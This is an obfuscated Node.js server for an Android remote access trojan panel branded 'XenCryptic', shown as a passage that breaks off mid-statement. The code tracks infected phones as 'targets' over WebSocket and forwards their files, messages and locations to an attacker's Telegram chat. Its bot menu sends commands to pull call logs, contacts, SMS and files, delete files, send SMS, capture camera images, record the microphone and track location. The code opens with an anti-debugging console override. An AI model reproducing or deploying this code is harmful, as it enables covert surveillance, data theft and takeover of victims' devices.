const _0x1be21d = function () {
  let _0x305db3 = true;
  return function (_0x2a9767, _0x57aa6e) {
    const _0x2dae28 = _0x305db3 ? function () {
      if (_0x57aa6e) {
        const _0x4e01e4 = _0x57aa6e.apply(_0x2a9767, arguments);
        _0x57aa6e = null;
        return _0x4e01e4;
      }
    } : function () {};
    _0x305db3 = false;
    return _0x2dae28;
  };
}();
const _0x459b13 = _0x1be21d(this, function () {
  const _0x54001d = function () {
    let _0x5c2bed;
    try {
      _0x5c2bed = Function("return (function() {}.constructor(\"return this\")( ));")();
    } catch (_0x371898) {
      _0x5c2bed = window;
    }
    return _0x5c2bed;
  };
  const _0xab3534 = _0x54001d();
  const _0x1749d9 = _0xab3534.console = _0xab3534.console || {};
  const _0x32e0ea = ["log", 'warn', 'info', 'error', "exception", "table", "trace"];
  for (let _0x597ff5 = 0x0; _0x597ff5 < _0x32e0ea.length; _0x597ff5++) {
    const _0x1e39c3 = _0x1be21d.constructor.prototype.bind(_0x1be21d);
    const _0x294a4a = _0x32e0ea[_0x597ff5];
    const _0x50cf3e = _0x1749d9[_0x294a4a] || _0x1e39c3;
    _0x1e39c3.__proto__ = _0x1be21d.bind(_0x1be21d);
    _0x1e39c3.toString = _0x50cf3e.toString.bind(_0x50cf3e);
    _0x1749d9[_0x294a4a] = _0x1e39c3;
  }
});
_0x459b13();
const fs = require('fs');
const WebSocket = require('ws');
const http = require("http");
const express = require("express");
const TelegramBot = require("node-telegram-bot-api");
const multer = require("multer");
const bodyParser = require("body-parser");
const {
  v4: uuidv4
} = require('uuid');
const config = JSON.parse(fs.readFileSync("config.json", "utf8"));
const TELEGRAM_TOKEN = config.telegram.token;
const CHAT_ID = config.telegram.chatId;
const SERVER_PORT = process.env.PORT || 0x2328;
const SERVER_ADDRESS = "http://localhost:" + SERVER_PORT;
const upload = multer();
const app = express();
app.use(bodyParser.json());
const server = http.createServer(app);
const wss = new WebSocket.Server({
  'server': server
});
const bot = new TelegramBot(TELEGRAM_TOKEN, {
  'polling': true
});
const clients = new Map();
app.get('/', (_0x32fd67, _0x317d17) => {
  _0x317d17.send("\n╔═══════════════════════════════════════════════════════════════════════════╗\n║          🕸️ 𝙒𝙀𝙇𝘾𝙊𝙈𝙀 𝙏𝙊 𝑿𝑬𝑵𝑪𝑹𝒀𝑷𝑻𝑰𝑪 𝘼𝙉𝘿𝙍𝙊𝙄𝘿 𝘿𝙀𝙑𝙄𝘾𝙀 𝘾𝙊𝙉𝙏𝙍𝙊𝙇 𝙍𝘼𝙏 𝙋𝘼𝙉𝙀𝙇          ║\n╠═══════════════════════════════════════════════════════════════════════════╣\n║                           𝙎𝙀𝙍𝙑𝙀𝙍 𝙄𝙎 𝙍𝙐𝙉𝙉𝙄𝙉𝙂                            ║\n╠═══════════════════════════════════════════════════════════════════════════╣\n║ 📡 𝙋𝙊𝙍𝙏: " + SERVER_PORT + "                                                 ║\n║ 🤖 𝘽𝙊𝙏: @" + bot.token.split(':')[0x0] + "_bot                                 ║\n║ 📊 𝘾𝙇𝙄𝙀𝙉𝙏𝙎: " + clients.size + "                                           ║\n║ 🔗 𝘾𝙃𝘼𝙉𝙉𝙀𝙇: " + "https://t.me/XenCrypticMethods" + "                                           ║\n║ 👨💻 𝘿𝙀𝙑𝙀𝙇𝙊𝙋𝙀𝙍: " + "@XenCryptic" + "                                           ║\n╚═══════════════════════════════════════════════════════════════════════════╝\n    ");
});
app.get("/status", (_0x1c9136, _0x4a78a2) => {
  _0x4a78a2.json({
    'status': "online",
    'clients': clients.size,
    'uptime': process.uptime(),
    'developer': "@Xencryptic",
    'channel': "https://t.me/XenCrypticMethods",
    'server': SERVER_ADDRESS
  });
});
app.post("/sendFile", upload.single("file"), (_0x225c73, _0x5ccca9) => {
  if (!_0x225c73.file) {
    return _0x5ccca9.status(0x190).json({
      'status': 'error',
      'message': "No file uploaded"
    });
  }
  const _0x43531c = _0x225c73.file.originalname;
  bot.sendDocument(CHAT_ID, _0x225c73.file.buffer, {}, {
    'filename': _0x43531c,
    'contentType': _0x225c73.file.mimetype || "application/octet-stream"
  }).then(() => {
    _0x5ccca9.json({
      'status': "success",
      'message': "✅ 𝙁𝙄𝙇𝙀 𝙎𝙀𝙉𝙏: " + _0x43531c,
      'timestamp': new Date().toISOString()
    });
  })['catch'](_0x4b3ea0 => {
    console.error("📁 𝙁𝙄𝙇𝙀 𝙐𝙋𝙇𝙊𝘼𝘿 𝙀𝙍𝙍𝙊𝙍:", _0x4b3ea0);
    _0x5ccca9.status(0x1f4).json({
      'status': 'error',
      'message': "Failed to send file"
    });
  });
});
app.post("/sendText", (_0x284daf, _0x45c8b9) => {
  const _0x11b079 = _0x284daf.body.text;
  if (!_0x11b079 || _0x11b079.trim() === '') {
    return _0x45c8b9.status(0x190).json({
      'status': "error",
      'message': "No message text provided"
    });
  }
  bot.sendMessage(CHAT_ID, _0x11b079, {
    'parse_mode': 'HTML',
    'disable_notification': false
  }).then(() => {
    _0x45c8b9.json({
      'status': "success",
      'message': "📝 𝙈𝙀𝙎𝙎𝘼𝙂𝙀 𝙎𝙀𝙉𝙏",
      'length': _0x11b079.length
    });
  })['catch'](_0x2453c2 => {
    console.error("📝 𝙈𝙀𝙎𝙎𝘼𝙂𝙀 𝙎𝙀𝙉𝘿 𝙀𝙍𝙍𝙊𝙍:", _0x2453c2);
    _0x45c8b9.status(0x1f4).json({
      'status': "error",
      'message': "Failed to send message"
    });
  });
});
app.post("/sendLocation", (_0xc809bd, _0x214ec0) => {
  const {
    l1: _0x5ad395,
    l2: _0x3e69a5
  } = _0xc809bd.body;
  if (!_0x5ad395 || !_0x3e69a5) {
    return _0x214ec0.status(0x190).json({
      'status': "error",
      'message': "Latitude and longitude required"
    });
  }
  bot.sendLocation(CHAT_ID, parseFloat(_0x5ad395), parseFloat(_0x3e69a5)).then(() => {
    _0x214ec0.json({
      'status': "success",
      'message': "📍 𝙇𝙊𝘾𝘼𝙏𝙄𝙊𝙉 𝙎𝙀𝙉𝙏",
      'coordinates': {
        'latitude': _0x5ad395,
        'longitude': _0x3e69a5
      }
    });
  })["catch"](_0x492052 => {
    console.error("📍 𝙇𝙊𝘾𝘼𝙏𝙄𝙊𝙉 𝙎𝙀𝙉𝘿 𝙀𝙍𝙍𝙊𝙍:", _0x492052);
    _0x214ec0.status(0x1f4).json({
      'status': "error",
      'message': "Failed to send location"
    });
  });
});
wss.on("connection", (_0x156297, _0x952005) => {
  const _0x126870 = uuidv4().substring(0x0, 0x8).toUpperCase();
  const _0x47aff8 = _0x952005.socket.remoteAddress || "Unknown IP";
  _0x156297.uuid = _0x126870;
  _0x156297.isAlive = true;
  clients.set(_0x126870, {
    'ws': _0x156297,
    'ip': _0x47aff8,
    'deviceInfo': null,
    'connectedAt': new Date(),
    'lastActivity': new Date()
  });
  const _0x31f561 = "\n🎯 <b>𝙉𝙀𝙒 𝙏𝘼𝙍𝙂𝙀𝙏 𝘾𝙊𝙉𝙉𝙀𝘾𝙏𝙀𝘿</b>\n\n• 🔑 𝘿𝙚𝙫𝙞𝙘𝙚 𝙄𝘿: <code>" + _0x126870 + "</code>\n• 📡 𝙄𝙋 𝘼𝘿𝘿𝙍𝙀𝙎𝙎: <code>" + _0x47aff8 + "</code>\n• 🕒 𝙏𝙄𝙈𝙀𝙎𝙏𝘼𝙈𝙋: " + new Date().toLocaleTimeString() + "\n• 📊 𝙏𝙊𝙏𝘼𝙇 𝘾𝙊𝙉𝙉𝙀𝘾𝙏𝙄𝙊𝙉𝙎: " + clients.size + "\n\n═══════════════════════════\n   𝘾𝙊𝙉𝙉𝙀𝘾𝙏𝙄𝙊𝙉 𝙎𝙏𝘼𝙏𝙐𝙎\n═══════════════════════════\n\n<i>Waiting for device information...</i>\n\n<a href=\"" + "https://t.me/XenCrypticMethods" + "\">📢 𝙏𝙀𝙇𝙀𝙂𝙍𝘼𝙈 𝘾𝙃𝘼𝙉𝙉𝙀𝙇</a>\n<a href=\"" + SERVER_ADDRESS + "\">🌐 𝙎𝙀𝙍𝙑𝙀𝙍 𝘼𝘿𝘿𝙍𝙀𝙎𝙎</a>\n𝘿𝙀𝙑𝙀𝙇𝙊𝙋𝙀𝙍 𝘽𝙔: " + "@Xencryptic" + "\n    ";
  bot.sendMessage(CHAT_ID, _0x31f561, {
    'parse_mode': "HTML",
    'disable_web_page_preview': true
  })["catch"](_0x42d633 => {
    console.error("Failed to send welcome message:", _0x42d633);
  });
  console.log("🔗 𝙉𝙀𝙒 𝘾𝙊𝙉𝙉𝙀𝘾𝙏𝙄𝙊𝙉: " + _0x126870 + " | 𝙄𝙋: " + _0x47aff8);
  try {
    _0x156297.send(JSON.stringify({
      'type': "request",
      'data': "device_info"
    }));
  } catch (_0xb7526b) {
    console.error("Failed to send device info request:", _0xb7526b);
  }
  _0x156297.on("pong", () => {
    _0x156297.isAlive = true;
  });
  _0x156297.on("message", _0x4b3926 => {
    try {
      const _0x1da111 = _0x4b3926.toString();
      const _0x3f16d5 = clients.get(_0x126870);
      if (_0x3f16d5) {
        _0x3f16d5.lastActivity = new Date();
      }
      console.log("📥 " + _0x126870 + ": " + _0x1da111.substring(0x0, 0x64));
      try {
        const _0x4ea25c = JSON.parse(_0x1da111);
        if (_0x4ea25c.type === "device_info" && _0x4ea25c.data) {
          const _0x3daca5 = clients.get(_0x126870);
          if (_0x3daca5) {
            _0x3daca5.deviceInfo = _0x4ea25c.data;
            const _0x3b05a7 = _0x4ea25c.data;
            const _0x31dd1f = "\n📱 <b>𝘿𝙀𝙑𝙄𝘾𝙀 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙏𝙄𝙊𝙉 𝙍𝙀𝘾𝙀𝙄𝙑𝙀𝘿</b>\n\n• 🖥️ 𝘿𝙚𝙫𝙞𝙘𝙚: " + (_0x3b05a7.model || "Unknown") + "\n• 🔋 𝘽𝙖𝙩𝙩𝙚𝙧𝙮: " + (_0x3b05a7.battery || '0') + "%\n• 📱 𝙑𝙚𝙧𝙨𝙞𝙤𝙣: " + (_0x3b05a7.version || "Unknown") + "\n• 📶 𝙋𝙧𝙤𝙫𝙞𝙙𝙚𝙧: " + (_0x3b05a7.provider || "Unknown") + "\n• 🔑 𝘿𝙚𝙫𝙞𝙘𝙚 𝙄𝘿: <code>" + _0x126870 + "</code>\n\n• 🕒 𝙏𝙄𝙈𝙀𝙎𝙏𝘼𝙈𝙋: " + new Date().toLocaleTimeString() + "\n                        ";
            bot.sendMessage(CHAT_ID, _0x31dd1f, {
              'parse_mode': "HTML",
              'disable_web_page_preview': true
            })["catch"](_0x29d4be => {
              console.error("Failed to send device info update:", _0x29d4be);
            });
          }
        }
      } catch (_0x5717d1) {}
    } catch (_0xf86e46) {
      console.error("Error processing message:", _0xf86e46);
    }
  });
  _0x156297.on("close", () => {
    const _0x346613 = clients.get(_0x126870);
    const _0x21a746 = _0x346613 ? Math.floor((new Date() - _0x346613.connectedAt) / 0x3e8) : 0x0;
    clients["delete"](_0x126870);
    const _0x34691a = "\n⚠️ <b>𝙏𝘼𝙍𝙂𝙀𝙏 𝘿𝙄𝙎𝘾𝙊𝙉𝙉𝙀𝘾𝙏𝙀𝘿</b>\n\n<b>𝙏𝘼𝙍𝙂𝙀𝙏 𝙄𝘿:</b> <code>" + _0x126870 + "</code>\n<b>𝘾𝙊𝙉𝙉𝙀𝘾𝙏𝙄𝙊𝙉 𝘿𝙐𝙍𝘼𝙏𝙄𝙊𝙉:</b> " + _0x21a746 + "𝙨\n<b>𝘼𝘾𝙏𝙄𝙑𝙀 𝘾𝙇𝙄𝙀𝙉𝙏𝙎:</b> " + clients.size + "\n        ";
    bot.sendMessage(CHAT_ID, _0x34691a, {
      'parse_mode': "HTML"
    })['catch'](_0x2a72f1 => {
      console.error("Failed to send disconnect message:", _0x2a72f1);
    });
    console.log("❌ 𝘾𝙇𝙄𝙀𝙉𝙏 𝘿𝙄𝙎𝘾𝙊𝙉𝙉𝙀𝘾𝙏𝙀𝘿: " + _0x126870 + " | 𝘿𝙪𝙧𝙖𝙩𝙞𝙤𝙣: " + _0x21a746 + 's');
  });
  _0x156297.on("error", _0x4e67e6 => {
    console.error("WebSocket error for client " + _0x126870 + ':', _0x4e67e6);
  });
});
const heartbeatInterval = setInterval(() => {
  wss.clients.forEach(_0x421ee7 => {
    if (_0x421ee7.isAlive === false) {
      return _0x421ee7.terminate();
    }
    _0x421ee7.isAlive = false;
    try {
      _0x421ee7.ping();
    } catch (_0x34635f) {
      console.error("Heartbeat ping failed:", _0x34635f);
    }
  });
}, 0x7530);
const keepAliveInterval = setInterval(() => {
  wss.clients.forEach(_0x3e4bd9 => {
    if (_0x3e4bd9.readyState === WebSocket.OPEN) {
      try {
        _0x3e4bd9.send('💓');
      } catch (_0x379654) {
        console.error("Keep-alive failed:", _0x379654);
      }
    }
  });
}, 0x1388);
const activeUsers = new Set();
activeUsers.add(CHAT_ID.toString());
bot.onText(/\/start/, _0x4a6288 => {
  const _0x523082 = _0x4a6288.chat.id.toString();
  activeUsers.add(_0x523082);
  const _0x39783e = "\n🚨 <b>𝙎𝙔𝙎𝙏𝙀𝙈 𝙎𝙏𝘼𝙏𝙐𝙎</b>\n\n═══════════════════════════\n   𝑿𝑬𝑵𝑪𝑹𝒀𝑷𝑻𝑰𝑪 𝘿𝙀𝙑𝙄𝘾𝙀 𝘾𝙊𝙉𝙏𝙍𝙊𝙇 𝙍𝘼𝙏 𝙋𝘼𝙉𝙀𝙇\n═══════════════════════════\n\n🎯 𝘼𝙘𝙩𝙞𝙫𝙚 𝙏𝙖𝙧𝙜𝙚𝙩𝙨: " + clients.size + "\n👥 𝘼𝙘𝙩𝙞𝙫𝙚 𝙐𝙨𝙚𝙧𝙨: " + activeUsers.size + "\n📡 𝙒𝙚𝙗𝙎𝙤𝙘𝙠𝙚𝙩 𝙎𝙩𝙖𝙩𝙪𝙨: 𝙊𝙉𝙇𝙄𝙉𝙀\n🤖 𝘽𝙤𝙩 𝙎𝙩𝙖𝙩𝙪𝙨: 𝙊𝙋𝙀𝙍𝘼𝙏𝙄𝙊𝙉𝘼𝙇\n⚠️ 𝙎𝙔𝙎𝙏𝙀𝙈: 𝙍𝙀𝘼𝘿𝙔 𝙁𝙊𝙍 𝙊𝙋𝙀𝙍𝘼𝙏𝙄𝙊𝙉\n\n═══════════════════════════\n   𝙌𝙐𝙄𝘾𝙆 𝘼𝘾𝘾𝙀𝙎𝙎\n═══════════════════════════\n\n<a href=\"" + "https://t.me/XenCrypticMethods" + "\">📢 𝙏𝙀𝙇𝙀𝙂𝙍𝘼𝙈 𝘾𝙃𝘼𝙉𝙉𝙀𝙇</a>\n<a href=\"" + SERVER_ADDRESS + "\">🌐 𝙎𝙀𝙍𝙑𝙀𝙍 𝘼𝘿𝘿𝙍𝙀𝙎𝙎</a>\n𝘿𝙀𝙑𝙀𝙇𝙊𝙋𝙀𝙍 𝘽𝙔: " + "@XenCryptic" + "\n\n<i>𝙎𝙀𝙇𝙀𝘾𝙏 𝘼𝙉 𝙊𝙋𝙏𝙄𝙊𝙉 𝘽𝙀𝙇𝙊𝙒:</i>\n    ";
  bot.sendMessage(_0x523082, _0x39783e, {
    'parse_mode': "HTML",
    'disable_web_page_preview': true,
    'reply_markup': {
      'keyboard': [["📊 𝙎𝙔𝙎𝙏𝙀𝙈 𝙎𝙏𝘼𝙏𝙐𝙎", "⚡ 𝘼𝘾𝙏𝙄𝙊𝙉 𝙈𝙀𝙉𝙐"], ["📱 𝘾𝙊𝙉𝙉𝙀𝘾𝙏𝙀𝘿 𝘿𝙀𝙑𝙄𝘾𝙀𝙎", "🔧 𝘾𝙊𝙉𝙁𝙄𝙂𝙐𝙍𝘼𝙏𝙄𝙊𝙉"], ["📈 𝙋𝙀𝙍𝙁𝙊𝙍𝙈𝘼𝙉𝘾𝙀", "❓ 𝙃𝙀𝙇𝙋 & 𝙄𝙉𝙁𝙊"]],
      'resize_keyboard': true,
      'one_time_keyboard': false
    }
  });
});
bot.onText(/📊 𝙎𝙔𝙎𝙏𝙀𝙈 𝙎𝙏𝘼𝙏𝙐𝙎/, _0xf8fad9 => {
  const _0x3a6af1 = _0xf8fad9.chat.id.toString();
  const _0x3fb5cb = Math.floor(process.uptime());
  const _0x583e08 = Math.floor(_0x3fb5cb / 0xe10);
  const _0x27d3cb = Math.floor(_0x3fb5cb % 0xe10 / 0x3c);
  const _0x5cf00c = _0x3fb5cb % 0x3c;
  const _0x42b640 = "\n🚨 <b>𝙎𝙔𝙎𝙏𝙀𝙈 𝙎𝙏𝘼𝙏𝙐𝙎</b>\n\n═══════════════════════════\n   𝙍𝙀𝘼𝙇-𝙏𝙄𝙈𝙀 𝙎𝙏𝘼𝙏𝙐𝙎\n═══════════════════════════\n\n🎯 𝘼𝙘𝙩𝙞𝙫𝙚 𝙏𝙖𝙧𝙜𝙚𝙩𝙨: " + clients.size + "\n👥 𝘼𝙘𝙩𝙞𝙫𝙚 𝙐𝙨𝙚𝙧𝙨: " + activeUsers.size + "\n📡 𝙒𝙚𝙗𝙎𝙤𝙘𝙠𝙚𝙩 𝙎𝙩𝙖𝙩𝙪𝙨: 𝙊𝙉𝙇𝙄𝙉𝙀\n🤖 𝘽𝙤𝙩 𝙎𝙩𝙖𝙩𝙪𝙨: 𝙊𝙋𝙀𝙍𝘼𝙏𝙄𝙊𝙉𝘼𝙇\n⚠️ 𝙎𝙔𝙎𝙏𝙀𝙈: 𝙍𝙀𝘼𝘿𝙔 𝙁𝙊𝙍 𝙊𝙋𝙀𝙍𝘼𝙏𝙄𝙊𝙉\n\n═══════════════════════════\n   𝙋𝙀𝙍𝙁𝙊𝙍𝙈𝘼𝙉𝘾𝙀\n═══════════════════════════\n\n🕒 𝙐𝙥𝙩𝙞𝙢𝙚: " + _0x583e08 + "h " + _0x27d3cb + "m " + _0x5cf00c + "s\n📨 𝙈𝙚𝙨𝙨𝙖𝙜𝙚𝙨: Processing...\n🔗 𝙏𝙤𝙩𝙖𝙡 𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙞𝙤𝙣𝙨: " + clients.size + "\n💾 𝙈𝙚𝙢𝙤𝙧𝙮: " + (process.memoryUsage().heapUsed / 0x400 / 0x400).toFixed(0x2) + "𝙈𝘽\n\n<a href=\"" + "https://t.me/XenCrypticMethods" + "\">📢 𝙏𝙀𝙇𝙀𝙂𝙍𝘼𝙈 𝘾𝙃𝘼𝙉𝙉𝙀𝙇</a>\n<a href=\"" + SERVER_ADDRESS + "\">🌐 𝙎𝙀𝙍𝙑𝙀𝙍 𝘼𝘿𝘿𝙍𝙀𝙎𝙎</a>\n𝘿𝙀𝙑𝙀𝙇𝙊𝙋𝙀𝙍 𝘽𝙔: " + "@Xencryptic" + "\n    ";
  bot.sendMessage(_0x3a6af1, _0x42b640, {
    'parse_mode': "HTML",
    'disable_web_page_preview': true
  });
});
bot.onText(/📱 𝘾𝙊𝙉𝙉𝙀𝘾𝙏𝙀𝘿 𝘿𝙀𝙑𝙄𝘾𝙀𝙎/, _0x48bd3b => {
  const _0x14fce7 = _0x48bd3b.chat.id.toString();
  if (clients.size > 0x0) {
    let _0x1ad7f7 = "\n📱 <b>𝘾𝙊𝙉𝙉𝙀𝘾𝙏𝙀𝘿 𝘿𝙀𝙑𝙄𝘾𝙀𝙎</b>\n\n═══════════════════════════\n   𝘼𝘾𝙏𝙄𝙑𝙀 𝘾𝙊𝙉𝙉𝙀𝘾𝙏𝙄𝙊𝙉𝙎: " + clients.size + "\n═══════════════════════════\n\n";
    Array.from(clients.entries()).forEach(([_0x2c811a, _0x20f97f], _0x5b13bf) => {
      const _0x559faf = _0x20f97f.deviceInfo || {};
      const _0x8c185d = Math.floor((new Date() - _0x20f97f.connectedAt) / 0x3e8);
      _0x1ad7f7 += "\n<b>𝘿𝙀𝙑𝙄𝘾𝙀 #" + (_0x5b13bf + 0x1) + "</b>\n├ 🆔: <code>" + _0x2c811a + "</code>\n├ 📱: " + (_0x559faf.model || "Waiting for info...") + "\n├ 🔋: " + (_0x559faf.battery || '?') + "%\n├ 📶: " + (_0x559faf.provider || "Unknown") + "\n├ 🌐: " + _0x20f97f.ip + "\n└ ⏱️: " + _0x8c185d + "s\n────────────────────\n";
    });
    _0x1ad7f7 += "\n<i>" + clients.size + " 𝙙𝙚𝙫𝙞𝙘𝙚(𝙨) 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙</i>\n        ";
    bot.sendMessage(_0x14fce7, _0x1ad7f7, {
      'parse_mode': "HTML"
    });
  } else {
    bot.sendMessage(_0x14fce7, "📭 <b>𝙉𝙊 𝘾𝙊𝙉𝙉𝙀𝘾𝙏𝙀𝘿 𝘿𝙀𝙑𝙄𝘾𝙀𝙎</b>\n\n<i>𝘼𝙬𝙖𝙞𝙩𝙞𝙣𝙜 𝙛𝙤𝙧 𝙙𝙚𝙫𝙞𝙘𝙚 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙞𝙤𝙣𝙨...</i>", {
      'parse_mode': "HTML"
    });
  }
});
bot.onText(/⚡ 𝘼𝘾𝙏𝙄𝙊𝙉 𝙈𝙀𝙉𝙐/, _0x416105 => {
  const _0x25724b = _0x416105.chat.id.toString();
  if (clients.size > 0x0) {
    const _0xb94360 = Array.from(clients.entries()).map(([_0x524131, _0x486c87]) => {
      const _0x198b34 = _0x486c87.deviceInfo || {};
      return [{
        'text': "📱 " + (_0x198b34.model || "Device") + " (" + _0x524131 + ')',
        'callback_data': "select_device_" + _0x524131
      }];
    });
    const _0x22a9e3 = "\n⚡ <b>𝘼𝘾𝙏𝙄𝙊𝙉 𝙈𝙀𝙉𝙐</b>\n\n═══════════════════════════\n   𝙎𝙀𝙇𝙀𝘾𝙏 𝘿𝙀𝙑𝙄𝘾𝙀\n═══════════════════════════\n\n<i>" + clients.size + " 𝙙𝙚𝙫𝙞𝙘𝙚(𝙨) 𝙖𝙫𝙖𝙞𝙡𝙖𝙗𝙡𝙚</i>\n<i>𝘾𝙡𝙞𝙘𝙠 𝙤𝙣 𝙖 𝙙𝙚𝙫𝙞𝙘𝙚 𝙩𝙤 𝙘𝙤𝙣𝙩𝙧𝙤𝙡:</i>\n        ";
    bot.sendMessage(_0x25724b, _0x22a9e3, {
      'parse_mode': "HTML",
      'reply_markup': {
        'inline_keyboard': _0xb94360
      }
    });
  } else {
    bot.sendMessage(_0x25724b, "📭 <b>𝙉𝙊 𝘾𝙊𝙉𝙉𝙀𝘾𝙏𝙀𝘿 𝘿𝙀𝙑𝙄𝘾𝙀𝙎</b>\n\n<i>𝘾𝙤𝙣𝙣𝙚𝙘𝙩 𝙖 𝙙𝙚𝙫𝙞𝙘𝙚 𝙛𝙞𝙧𝙨𝙩 𝙩𝙤 𝙪𝙨𝙚 𝙖𝙘𝙩𝙞𝙤𝙣𝙨</i>", {
      'parse_mode': "HTML"
    });
  }
});
bot.on("callback_query", _0x630bb5 => {
  const _0x42f1f1 = _0x630bb5.data;
  const _0x45ce51 = _0x630bb5.from.id;
  if (_0x42f1f1.startsWith("select_device_")) {
    const _0x453804 = _0x42f1f1.replace("select_device_", '');
    const _0x3b2a4f = clients.get(_0x453804);
    if (_0x3b2a4f) {
      const _0x4021f5 = _0x3b2a4f.deviceInfo || {};
      const _0x4072d3 = Math.floor((new Date() - _0x3b2a4f.connectedAt) / 0x3e8);
      const _0x27cfb8 = [[{
        'text': "📞 𝘾𝘼𝙇𝙇 𝙇𝙊𝙂",
        'callback_data': 'cl_' + _0x453804
      }, {
        'text': "👥 𝘾𝙊𝙉𝙏𝘼𝘾𝙏𝙎",
        'callback_data': "gc_" + _0x453804
      }], [{
        'text': "📱 𝘼𝙋𝙋𝙎 𝙇𝙄𝙎𝙏",
        'callback_data': "as_" + _0x453804
      }, {
        'text': "✉️ 𝙎𝙀𝙉𝘿 𝙎𝙈𝙎",
        'callback_data': "ss_" + _0x453804
      }], [{
        'text': "💬 𝙈𝙀𝙎𝙎𝘼𝙂𝙀𝙎",
        'callback_data': "ia_" + _0x453804
      }, {
        'text': "📟 𝘿𝙀𝙑𝙄𝘾𝙀 𝙄𝙉𝙁𝙊",
        'callback_data': "dm_" + _0x453804
      }], [{
        'text': "📂 𝙂𝙀𝙏 𝙁𝙄𝙇𝙀",
        'callback_data': "gf_" + _0x453804
      }, {
        'text': "🗑️ 𝘿𝙀𝙇 𝙁𝙄𝙇𝙀",
        'callback_data': "df_" + _0x453804
      }], [{
        'text': "📷 𝙍𝙀𝘼𝙍 𝘾𝘼𝙈",
        'callback_data': "cam1_" + _0x453804
      }, {
        'text': "🤳 𝙁𝙍𝙊𝙉𝙏 𝘾𝘼𝙈",
        'callback_data': "cam2_" + _0x453804
      }], [{
        'text': "🎤 𝙈𝙄𝘾 𝙍𝙀𝘾𝙊𝙍𝘿",
        'callback_data': "mi1_" + _0x453804
      }, {
        'text': "📍 𝙇𝙊𝘾𝘼𝙏𝙄𝙊𝙉",
        'callback_data': "loc_" + _0x453804
      }]];
      const _0x32f4d3 = "\n🎯 <b>𝘿𝙀𝙑𝙄𝘾𝙀 𝘾𝙊𝙉𝙏𝙍𝙊𝙇 𝙋𝘼𝙉𝙀𝙇</b>\n\n═══════════════════════════\n   𝙎𝙀𝙇𝙀𝘾𝙏𝙀𝘿 𝘿𝙀𝙑𝙄𝘾𝙀\n═══════════════════════════\n\n<b>📱 𝘿𝙀𝙑𝙄𝘾𝙀:</b> " + (_0x4021f5.model || "Unknown") + "\n<b>🔋 𝘽𝘼𝙏𝙏𝙀𝙍𝙔:</b> " + (_0x4021f5.battery || '0') + "%\n<b>📶 𝙋𝙍𝙊𝙑𝙄𝘿𝙀𝙍:</b> " + (_0x4021f5.provider || "Unknown") + "\n<b>🆔 𝘿𝙀𝙑𝙄𝘾𝙀 𝙄𝘿:</b> <code>" + _0x453804 + "</code>\n<b>🌐 𝙄𝙋 𝘼𝘿𝘿𝙍𝙀𝙎𝙎:</b> " + _0x3b2a4f.ip + "\n<b>⏱️ 𝙐𝙋𝙏𝙄𝙈𝙀:</b> " + _0x4072d3 + "s\n\n<i>𝙎𝙀𝙇𝙀𝘾𝙏 𝘼𝙉 𝘼𝘾𝙏𝙄𝙊𝙉:</i>\n            ";
      bot.sendMessage(_0x45ce51, _0x32f4d3, {
        'parse_mode': "HTML",
        'reply_markup': {
          'inline_keyboard': _0x27cfb8
        }
      });
      bot.answerCallbackQuery(_0x630bb5.id);
    }
  } else {
    if (_0x42f1f1.startsWith("cl_") || _0x42f1f1.startsWith("gc_") || _0x42f1f1.startsWith("as_") || _0x42f1f1.startsWith('ia_') || _0x42f1f1.startsWith("dm_") || _0x42f1f1.startsWith("cam1_") || _0x42f1f1.startsWith('cam2_') || _0x42f1f1.startsWith("mi1_") || _0x42f1f1.startsWith("loc_") || _0x42f1f1.startsWith("gf_") || _0x42f1f1.startsWith("df_") || _0x42f1f1.startsWith("ss_")) {
      const _0x2817a3 = _0x42f1f1.split('_');
      const _0xe987e1 = _0x2817a3[0x0];
      const _0x16b8b4 = _0x2817a3[0x1];
      const _0x106949 = clients.get(_0x16b8b4);
      if (_0x106949 && _0x106949.ws.readyState === WebSocket.OPEN) {
        try {
          _0x106949.ws.send(_0xe987e1);
          bot.answerCallbackQuery(_0x630bb5.id, {
            'text': "✅ 𝘾𝙊𝙈𝙈𝘼𝙉𝘿 𝙎𝙀𝙉𝙏 𝙏𝙊 𝘿𝙀𝙑𝙄𝘾𝙀 " + _0x16b8b4,
            'show_alert': false
          });
        } catch (_0x4511ed) {
          bot.answerCallbackQuery(_0x630bb5.id, {
            'text': "❌ Failed to send command to device " + _0x16b8b4,
            'show_alert': true
          });
        }
      } else {
        bot.answerCallbackQuery(_0x630bb5.id, {
          'text': "❌ Device " + _0x16b8b4 + " is not connected",
          'show_alert': true
        });
      }
    }
  }
});
bot.onText(/🔧 𝘾𝙊𝙉𝙁𝙄𝙂𝙐𝙍𝘼𝙏𝙄𝙊𝙉/, _0x1941a5 => {
  const _0x59230f = _0x1941a5.chat.id.toString();
  const _0x131097 = "\n🔧 <b>𝙎𝙔𝙎𝙏𝙀𝙈 𝘾𝙊𝙉𝙁𝙄𝙂𝙐𝙍𝘼𝙏𝙄𝙊𝙉</b>\n\n═══════════════════════════\n   𝘾𝙐𝙍𝙍𝙀𝙉𝙏 𝙎𝙀𝙏𝙏𝙄𝙉𝙂𝙎\n═══════════════════════════\n\n<b>🏷️ 𝙎𝙀𝙍𝙑𝙀𝙍 𝙄𝙉𝙁𝙊:</b>\n├ 𝙋𝙤𝙧𝙩: " + SERVER_PORT + "\n├ 𝘽𝙤𝙩 𝙄𝘿: " + bot.token.split(':')[0x0] + "\n├ 𝘾𝙝𝙖𝙩 𝙄𝘿: " + CHAT_ID + "\n└ 𝘼𝙙𝙙𝙧𝙚𝙨𝙨: " + SERVER_ADDRESS + "\n\n<b>📊 𝙎𝙏𝘼𝙏𝙄𝙎𝙏𝙄𝘾𝙎:</b>\n├ 𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝘿𝙚𝙫𝙞𝙘𝙚𝙨: " + clients.size + "\n├ 𝘼𝙘𝙩𝙞𝙫𝙚 𝙐𝙨𝙚𝙧𝙨: " + activeUsers.size + "\n├ 𝙐𝙥𝙩𝙞𝙢𝙚: " + Math.floor(process.uptime()) + "𝙨\n└ 𝙈𝙚𝙢𝙤𝙧𝙮: " + (process.memoryUsage().heapUsed / 0x400 / 0x400).toFixed(0x2) + "𝙈𝘽\n\n<a href=\"" + "https://t.me/XenCrypticMethods" + "\">📢 𝙏𝙀𝙇𝙀𝙂𝙍𝘼𝙈 𝘾𝙃𝘼𝙉𝙉𝙀𝙇</a>\n<a href=\"" + SERVER_ADDRESS 